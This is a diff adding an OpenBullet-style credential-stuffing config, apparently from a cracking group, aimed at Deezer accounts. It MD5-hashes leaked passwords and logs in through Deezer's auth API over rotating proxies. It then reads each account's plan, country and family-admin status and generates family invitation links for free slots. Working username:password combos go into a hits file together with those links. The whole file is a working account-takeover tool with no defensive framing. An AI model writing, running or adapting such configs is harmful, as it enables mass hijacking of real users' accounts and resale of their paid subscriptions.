@@ -1,0 +1,157 @@
+[SETTINGS]
+{
+  "Name": "Deezer",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-22T01:55:35.6628566+03:00",
+  "AdditionalInfo": "",
+  "Author": " e a m",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#CrackTurkey FUNCTION Hash MD5 "<PASS>" -> VAR "Pass_Md5" 
+
+#CrackTurkey FUNCTION Hash MD5 "172365<USER><Pass_Md5>fb0bec7ccc063dab0417eb7b0d847f34" -> VAR "Hash_Md5" 
+
+#CrackTurkey REQUEST GET "https://api.deezer.com/auth/token?app_id=172365&login=<USER>&password=<Pass_Md5>&hash=<Hash_Md5>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CrackTurkey KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "authenticate user failed" 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+
+#CrackTurkey PARSE "<SOURCE>" JSON "access_token" JTokenParsing=TRUE -> VAR "access_token" 
+
+#CrackTurkey REQUEST GET "https://api.deezer.com/platform/generic/track/3135556" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+  HEADER "Authorization: f\"Bearer <access_token>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CrackTurkey REQUEST GET "https://www.deezer.com/ajax/gw-light.php?method=deezer.getUserData&input=3&api_version=1.0&api_token=null" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CrackTurkey KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "Quota limit exceeded" 
+
+#CrackTurkey KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "can_subscribe\":true," 
+    KEY "{\"USER_ID\":0," 
+
+#CrackTurkey PARSE "<SOURCE>" JSON "results.COUNTRY" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Pays" 
+
+#CrackTurkey PARSE "<SOURCE>" JSON "results.OFFER_NAME" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Type_abonnement" 
+
+IF "<SOURCE>" DoesNotContain "\"DATE_END\":\"2099"
+JUMP #Expire PARSE
+ELSE
+JUMP #sub_account PARSE
+END
+
+#CrackTurkey PARSE "<SOURCE>" JSON "results.USER.TRY_AND_BUY.DATE_END" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Expire" 
+
+#CrackTurkey PARSE "<SOURCE>" JSON "results.USER.MULTI_ACCOUNT.IS_SUB_ACCOUNT" JTokenParsing=TRUE -> VAR "sub_account" 
+
+IF "<SOURCE>" Contains "\"MULTI_ACCOUNT\":{\"ENABLED\":true,\"ACTIVE\":true,\""
+JUMP #Compte_Admin FUNCTION
+ELSE
+JUMP #CHECK_Final KEYCHECK
+END
+
+#CrackTurkey FUNCTION Translate 
+  KEY "True" VALUE "non" 
+  KEY "False" VALUE "oui" 
+  "<sub_account>" -> CAP "Compte_Admin" 
+
+IF "<SOURCE>" Contains Contains "\"IS_SUB_ACCOUNT\":false"
+JUMP #max_children PARSE
+ELSE
+JUMP #CHECK_Final KEYCHECK
+ENDIF
+
+#CrackTurkey PARSE "<SOURCE>" JSON "results.USER.MULTI_ACCOUNT.MAX_CHILDREN" JTokenParsing=TRUE -> VAR "max_children" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "\"CHILD_COUNT\":" "," -> VAR "child_count" 
+
+#CrackTurkey FUNCTION Replace "null" "0" "<child_count>" -> VAR "child_count_null" 
+
+#CrackTurkey FUNCTION Compute "<max_children>-<child_count_null>" -> CAP "Membres_Restants" 
+
+IF "<Membres_Restants>" NotEqualTo "0"
+JUMP #checkForm PARSE
+ELSE
+JUMP #CHECK_Final KEYCHECK
+ENDIF
+
+#CrackTurkey PARSE "<SOURCE>" LR "\"checkForm\":\"" "\"" -> VAR "checkForm" 
+
+#CrackTurkey REQUEST GET "https://www.deezer.com/ajax/gw-light.php?method=family.generateInvitationLink&input=3&api_version=1.0&api_token=<checkForm>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CrackTurkey PARSE "<SOURCE>" JSON "results" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Lien_Invitation" 
+
+#CrackTurkey KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<Type_abonnement>" NotEqualTo "" 
+
+IF "<Compte_Admin>" EqualTo "oui"
+
+#CrackTurkey UTILITY File "Hits\\deezerfamily.txt" AppendLines "✔️------Family Deezer------✔️\\n\\nCombo : <USER>:<PASS>\\n\\nPlan : <Type_abonnement>\\n\\nInvite link : <Lien_Invitation>\\n\\n\\n-----------------------------------------------------------------------\\n\\n" 
+
+ENDIF
+
